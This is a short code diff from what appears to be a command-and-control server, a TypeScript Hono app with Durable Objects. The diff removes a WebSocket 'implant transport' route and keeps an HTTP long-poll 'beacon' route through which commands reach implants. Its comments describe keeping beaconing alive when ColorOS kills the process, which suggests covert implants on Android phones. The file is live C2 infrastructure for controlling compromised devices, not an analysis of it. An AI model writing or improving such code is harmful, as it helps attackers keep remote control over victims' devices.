@@ -11,26 +11,10 @@ export interface Env {
 
 const app = new Hono<{ Bindings: Env }>();
 
-// 1. Implant Transport Endpoint (WebSocket Upgrade)
-app.get('/t/:transport/:implantId', async (c) => {
-  const upgradeHeader = c.req.header('Upgrade');
-  if (upgradeHeader !== 'websocket') {
-    return c.text('Expected Upgrade: websocket', 426);
-  }
-
-  const implantId = c.req.param('implantId');
-  const transport = c.req.param('transport');
-
-  const id = c.env.IMPLANT_STATE.idFromName(implantId);
-  const stub = c.env.IMPLANT_STATE.get(id);
-
-  return stub.fetch(c.req.raw);
-});
-
-// 1b. Beacon transport (HTTP long-poll). Preferred over /t/wss: no WebSocket,
-// so nothing can go wrong in the Worker <-> DO socket handoff, and a process
-// that ColorOS reaps every ~40s simply resumes beaconing on its next tick.
-// Command delivery is still immediate: the DO resolves the parked poll.
+// 1. Beacon transport (HTTP long-poll). The only transport — WebSocket was
+// removed; a process that ColorOS reaps every ~40s simply resumes beaconing on
+// its next tick. Command delivery is still immediate: the DO resolves the parked
+// poll.
 app.post('/t/poll/:implantId', async (c) => {
   const implantId = c.req.param('implantId');
   const stub = c.env.IMPLANT_STATE.get(c.env.IMPLANT_STATE.idFromName(implantId));
